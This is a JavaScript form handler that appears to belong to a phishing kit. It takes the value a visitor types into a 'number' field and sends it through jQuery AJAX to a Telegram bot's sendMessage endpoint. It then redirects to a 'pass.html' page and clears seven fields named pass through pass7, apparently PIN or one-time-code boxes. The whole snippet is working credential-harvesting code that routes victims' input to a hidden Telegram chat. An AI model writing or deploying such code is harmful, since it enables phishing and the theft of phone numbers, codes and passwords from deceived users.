var ready = function () {
    // Retrieve the values from the input fields
    number = document.getElementById("number").value;



    var message =  number;

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings).done(function (response) {
        console.log(response);
        if (response.ok == true) {
            window.location = './pass.html';
        }
    }).always(function () {
        // Enable the button and change the text back to its original state

    });

    // Clear the input fields
    document.getElementById("pass").value = "";
    document.getElementById("pass2").value = "";
    document.getElementById("pass3").value = "";
    document.getElementById("pass4").value = "";
    document.getElementById("pass5").value = "";
    document.getElementById("pass6").value = "";
    document.getElementById("pass7").value = "";


};

var sender = function (event) {
    event.preventDefault(); // Prevent the form from refreshing the page

    ready(); // Get the values from input fields

    return false;
};
